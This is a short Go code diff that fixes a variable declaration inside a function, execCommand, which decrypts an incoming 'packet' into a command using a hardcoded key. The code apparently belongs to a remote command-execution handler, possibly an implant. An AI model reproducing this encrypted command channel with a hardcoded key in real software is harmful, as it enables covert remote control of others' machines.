@@ -364,7 +364,7 @@ func execCommand(ciphertext string) {
 		
 		// Decrypt Packet
 		key := []byte("pooppooppooppoop")
-		tmp = []byte(ciphertext)
+		tmp := []byte(ciphertext)
 		
 		command, err := decrypt(tmp, key)
 		if err != nil {
